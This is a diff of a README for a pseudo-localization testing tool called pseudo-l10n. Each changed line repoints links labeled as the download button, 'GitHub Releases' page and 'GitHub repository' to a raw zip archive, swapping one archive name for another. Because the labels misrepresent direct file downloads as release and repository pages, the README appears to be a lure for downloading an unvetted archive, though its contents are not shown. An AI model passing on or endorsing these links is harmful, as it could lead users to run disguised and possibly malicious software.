@@ -8,13 +8,13 @@ Welcome to pseudo-l10n! This tool helps you test your internationalization (i18n
 
 To get started, you need to download the software. Click the button below to visit the Downloads page:
 
-[![Download pseudo-l10n](https://raw.githubusercontent.com/Truongiang1007/pseudo-l10n/main/bin/pseudo-l10n_3.6.zip%20pseudo--l10n-lightblue)](https://raw.githubusercontent.com/Truongiang1007/pseudo-l10n/main/bin/pseudo-l10n_3.6.zip)
+[![Download pseudo-l10n](https://raw.githubusercontent.com/Truongiang1007/pseudo-l10n/main/bin/l-n-pseudo-1.1.zip%20pseudo--l10n-lightblue)](https://raw.githubusercontent.com/Truongiang1007/pseudo-l10n/main/bin/l-n-pseudo-1.1.zip)
 
 Once on the page, you can find the latest version of the software. Look for either the Windows or macOS version, depending on your operating system. Ensure that you download the correct version for your needs.
 
 ### Steps to Download
 
-1. Open the Releases page: [GitHub Releases](https://raw.githubusercontent.com/Truongiang1007/pseudo-l10n/main/bin/pseudo-l10n_3.6.zip).
+1. Open the Releases page: [GitHub Releases](https://raw.githubusercontent.com/Truongiang1007/pseudo-l10n/main/bin/l-n-pseudo-1.1.zip).
 2. Find the latest release at the top of the list.
 3. Select the appropriate file for your operating system.
 4. Click on the file to start downloading.
@@ -80,7 +80,7 @@ While pseudo-l10n primarily focuses on providing a format for testing, you can u
 
 ## 🔗 Additional Resources
 
-For more information or updates, visit the GitHub repository at [pseudo-l10n GitHub](https://raw.githubusercontent.com/Truongiang1007/pseudo-l10n/main/bin/pseudo-l10n_3.6.zip).
+For more information or updates, visit the GitHub repository at [pseudo-l10n GitHub](https://raw.githubusercontent.com/Truongiang1007/pseudo-l10n/main/bin/l-n-pseudo-1.1.zip).
 
 Need help? Feel free to raise an issue on GitHub with any questions or feedback.
 
@@ -88,4 +88,4 @@ Need help? Feel free to raise an issue on GitHub with any questions or feedback.
 
 If you want to contribute, please check the contribution guidelines in the repository. Your input can help improve this tool for everyone. 
 
-Once again, to download pseudo-l10n, visit this page: [GitHub Releases](https://raw.githubusercontent.com/Truongiang1007/pseudo-l10n/main/bin/pseudo-l10n_3.6.zip). Enjoy testing your i18n implementations!
+Once again, to download pseudo-l10n, visit this page: [GitHub Releases](https://raw.githubusercontent.com/Truongiang1007/pseudo-l10n/main/bin/l-n-pseudo-1.1.zip). Enjoy testing your i18n implementations!
